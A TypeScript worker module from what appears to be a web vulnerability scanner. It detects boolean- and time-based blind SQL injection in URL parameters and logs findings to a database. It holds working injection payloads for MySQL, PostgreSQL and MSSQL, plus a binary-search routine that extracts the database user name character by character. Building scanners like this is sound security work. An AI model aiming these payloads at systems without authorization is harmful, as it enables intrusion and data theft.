import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import { URL } from 'url';
import crypto from 'crypto';
import { executeRequest, recordVulnerability, COMMON_FALLBACK_PARAMS, TIME_DELAY_THRESHOLD } from './common';

// ============================================================================
// ⚙️ CONFIGURATION
// ============================================================================

interface Baseline {
    status: number;
    length: number;
    bodyHash: string;
}

// ============================================================================
// 🛡️ MAIN ATTACK LOGIC
// ============================================================================

export async function executeBlindAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId } = job.data;
    console.log('[Vector 2] 🕵️ Starting Blind SQLi Attack (Boolean & Time)...');
    
    let foundVulnerability = false;

    for (const param of COMMON_FALLBACK_PARAMS) {
        console.log(`\n[Vector 2] 🎯 Testing Parameter: [${param}]`);

        // 1. Establish a reliable baseline
        const baseline = await getBaseline(targetUrl, param);
        if (!baseline) continue;

        // 2. Try Boolean-Based (The Interrogator)
        // This is faster and preferred over Time-Based if possible
        if (await runBooleanAttack(targetUrl, param, baseline, scanId, prisma)) {
            foundVulnerability = true;
            continue; // If Boolean works, we don't strictly need Time-Based for this param
        }

        // 3. Try Time-Based (The Ghost) - Last Resort
        if (await runTimeBasedAttack(targetUrl, param, scanId, prisma)) {
            foundVulnerability = true;
        }
    }

    return foundVulnerability;
}

// ============================================================================
// ⚡ HELPER FUNCTIONS (Attack Vectors)
// ============================================================================

/**
 * Establishes a baseline response for comparison.
 */
async function getBaseline(targetUrl: string, param: string): Promise<Baseline | null> {
    try {
        const baselineUrl = new URL(targetUrl);
        if (!baselineUrl.searchParams.has(param)) {
            baselineUrl.searchParams.set(param, '1');
        }
        const { response, responseBody } = await executeRequest(baselineUrl.toString());
        
        return {
            status: response?.status || 0,
            length: responseBody.length,
            bodyHash: crypto.createHash('md5').update(responseBody).digest('hex'),
        };
    } catch (error: any) {
        console.error(`[Vector 2] Baseline failed for ${param}: ${error.message}`);
        return null;
    }
}

/**
 * Executes Boolean-Based Blind SQL Injection checks.
 */
async function runBooleanAttack(
    targetUrl: string, 
    param: string, 
    baseline: Baseline, 
    scanId: string, 
    prisma: PrismaClient
): Promise<boolean> {
    try {
        // Test True Condition (Should match baseline)
        const trueUrl = new URL(targetUrl);
        trueUrl.searchParams.set(param, `' AND 1=1--`);
        const trueRes = await executeRequest(trueUrl.toString());
        const trueHash = crypto.createHash('md5').update(trueRes.responseBody).digest('hex');

        // Test False Condition (Should differ from baseline)
        const falseUrl = new URL(targetUrl);
        falseUrl.searchParams.set(param, `' AND 1=2--`);
        const falseRes = await executeRequest(falseUrl.toString());
        const falseHash = crypto.createHash('md5').update(falseRes.responseBody).digest('hex');

        // Verification Logic
        if (trueRes.status === baseline.status && 
            trueHash === baseline.bodyHash && 
            falseHash !== baseline.bodyHash) {
            
            console.log(`[Vector 2] ✅ Boolean-Based SQLi Confirmed on '${param}'`);
            
            // Attempt to extract data (Proof of Concept)
            const extractedChar = await extractFirstChar(targetUrl, param, baseline);
            
            const proof = `True Payload: ' AND 1=1--\nFalse Payload: ' AND 1=2--\nBaseline Hash: ${baseline.bodyHash}\nFalse Hash: ${falseHash}\nExtracted Data: ${extractedChar || 'N/A'}`;
            await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.HIGH, 
                `Boolean-Based Blind SQLi in '${param}'`, proof);
            
            return true;
        }
    } catch (e) { /* ignore */ }
    return false;
}

/**
 * Helper to extract a single character using Binary Search (Efficiency Boost).
 */
async function extractFirstChar(targetUrl: string, param: string, baseline: Baseline): Promise<string | null> {
    let low = 32, high = 126; // Printable ASCII
    
    while (low <= high) {
        const mid = Math.floor((low + high) / 2);
        const payload = `' AND ASCII(SUBSTRING(user(), 1, 1)) > ${mid}--`;
        
        const url = new URL(targetUrl);
        url.searchParams.set(param, payload);
        const { responseBody } = await executeRequest(url.toString());
        const currentHash = crypto.createHash('md5').update(responseBody).digest('hex');

        if (currentHash === baseline.bodyHash) {
            low = mid + 1;
        } else {
            high = mid - 1;
        }
    }
    
    // Double check if we found a valid char
    if (low > 31 && low < 127) return String.fromCharCode(low);
    return null;
}

/**
 * Executes Time-Based Blind SQL Injection checks with statistical verification.
 */
async function runTimeBasedAttack(targetUrl: string, param: string, scanId: string, prisma: PrismaClient): Promise<boolean> {
    try {
        // 1. Calculate Average Baseline Latency (Statistical Analysis)
        // We take 3 measurements to rule out network jitter
        let totalTime = 0;
        for (let i = 0; i < 3; i++) {
            const url = new URL(targetUrl);
            url.searchParams.set(param, '1');
            const res = await executeRequest(url.toString());
            totalTime += res.responseTime;
        }
        const avgBaseline = totalTime / 3;

        // 2. Test Payloads
        const timePayloads = [
            '\' AND SLEEP(5)--',                // MySQL
            '\' AND pg_sleep(5)--',             // PostgreSQL
            '\' ;WAITFOR DELAY \'0:0:5\'--',    // MSSQL
        ];

        for (const payload of timePayloads) {
            const timeUrl = new URL(targetUrl);
            timeUrl.searchParams.set(param, payload);
            
            const { responseTime } = await executeRequest(timeUrl.toString());
            
            // Verification: Is the response significantly slower?
            if (responseTime > (avgBaseline + TIME_DELAY_THRESHOLD)) {
                console.log(`[Vector 2] ✅ Time-Based SQLi Confirmed: ${payload}`);
                
                const proof = `Avg Baseline: ${avgBaseline.toFixed(0)}ms\nInjection Time: ${responseTime}ms\nPayload: ${payload}`;
                await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, 
                    `Time-Based Blind SQLi in '${param}'`, proof);
                
                return true;
            }
        }
    } catch (e) { /* ignore */ }
    return false;
}